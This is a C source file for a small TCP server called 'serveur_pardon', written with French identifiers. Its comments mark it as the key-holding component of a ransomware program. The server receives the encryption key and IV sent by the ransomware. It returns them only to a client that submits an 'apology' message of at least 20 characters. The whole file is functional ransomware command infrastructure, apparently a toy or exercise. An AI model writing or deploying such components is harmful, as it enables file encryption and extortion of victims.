#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 4242

char CLE_HEX[65];
char IV_HEX[33];

void sauvegarder_infos(const char *cle_hex, const char *iv_hex) {
    strncpy(CLE_HEX, cle_hex, 64);
    CLE_HEX[64] = '\0';
    strncpy(IV_HEX, iv_hex, 32);
    IV_HEX[32] = '\0';
    printf("📦 Clé/IV reçues et enregistrées.\n");
}

void attendre_connexion_et_gerer() {
    int serveur, client;
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);
    char buffer[1024];

    serveur = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    bind(serveur, (struct sockaddr *)&addr, sizeof(addr));
    listen(serveur, 1);

    printf("🛡️  Serveur d'excuses en attente sur le port %d...\n", PORT);

    while (1) {
        client = accept(serveur, (struct sockaddr *)&addr, &addrlen);
        printf("📥 Connexion entrante...\n");

        memset(buffer, 0, sizeof(buffer));
        read(client, buffer, sizeof(buffer));

        if (strncmp(buffer, "CLE=", 4) == 0) {
            // Réception clé + IV du ransomware
            char *iv_part = strstr(buffer, "IV=");
            if (iv_part) {
                char cle_hex[65], iv_hex[33];
                sscanf(buffer, "CLE=%64s\nIV=%32s", cle_hex, iv_hex);
                sauvegarder_infos(cle_hex, iv_hex);
                write(client, "OK\n", 3);
            } else {
                write(client, "ERREUR_FORMAT\n", 14);
            }

        } else {
            // Réception message d’excuse du client
            if (strlen(buffer) >= 20) {
                printf("🙏 Excuses acceptées : %s\n", buffer);
                char reponse[200];
                snprintf(reponse, sizeof(reponse), "CLE=%s\nIV=%s\n", CLE_HEX, IV_HEX);
                write(client, reponse, strlen(reponse));
            } else {
                printf("⛔ Excuses trop courtes : %s\n", buffer);
                write(client, "REFUS : excuses insuffisantes\n", 31);
            }
        }

        close(client);
    }
}
int main() {
    printf("🔐 Lancement du serveur_pardon...\n");
    attendre_connexion_et_gerer();
    return 0;
}
